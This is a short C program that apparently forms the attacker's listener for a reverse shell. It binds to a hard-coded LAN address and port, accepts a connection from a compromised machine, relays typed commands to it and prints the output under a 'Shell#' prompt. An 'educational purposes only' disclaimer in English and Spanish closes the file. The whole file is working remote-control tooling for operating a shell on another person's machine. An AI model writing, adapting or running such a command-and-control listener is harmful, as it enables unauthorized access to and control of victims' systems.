#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main()
{
  int sock,client_socket;
  char buffer[1024];
  char response[18384];
  struct sockaddr_in server_address,client_address;
  int i=0;
  int optval=1;
  socklen_t client_length;

  sock = socket(AF_INET, SOCK_STREAM,0);

  if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
    printf("Error Setting TCP Socket options!\n");
      return 1;
  }
  /*Aquí modificamos el parámetro de la ip*/
  server_address.sin_family = AF_INET;
  server_address.sin_addr.s_addr = inet_addr("192.168.1.104");
  server_address.sin_port = htons(50004);


  bind(sock,(struct sockaddr *) &server_address,sizeof(server_address));
  listen(sock,5);
  client_length = sizeof(client_address);
  client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);
  
  while (1)
  {
  jump:
    bzero(&buffer,sizeof(buffer));
    bzero(&response,sizeof(response));
    printf("* Shell#%s~$:",inet_ntoa(client_address.sin_addr));
    fgets(buffer,sizeof(buffer),stdin);
    strtok(buffer,"\n");
    if(strncmp("clear",buffer,5) == 0 ){
      system("clear");
      goto jump;
    }
    write(client_socket,buffer,sizeof(buffer));
      if(strncmp("q",buffer,1) == 0){
      break;
    }
    else if (strncmp("cd", buffer,3)==0){
      goto jump;
    }
    else{
      recv(client_socket,response, sizeof(response),MSG_WAITALL);
      printf("%s",response);
    }
  }
  close(client_socket);
  close(sock);
}

/*This tool may only be used for educational purposes. The user assumes full responsibility for any 
action taken with the use of the tool. The author is not responsible for any damage caused by this tool 
offered on his site. If these terms do not suit your needs, do not use this tool. By using it, you declare 
to have taken knowledge of the terms mentioned above.
Esta herramienta solo puede ser utilizada para fines educativos. El usuario asume toda la responsabilidad 
por cualquier acción tomada con el uso de la herramienta. El autor no se hace responsable por cualquier daño 
causado por esta herramienta ofrecida en su página. Si estos términos no se ajustan a sus necesidades,no utilice 
esta herramienta. Al utilizarla, usted declara haber tomado conocimiento de los términos mencionados anteriormente.*/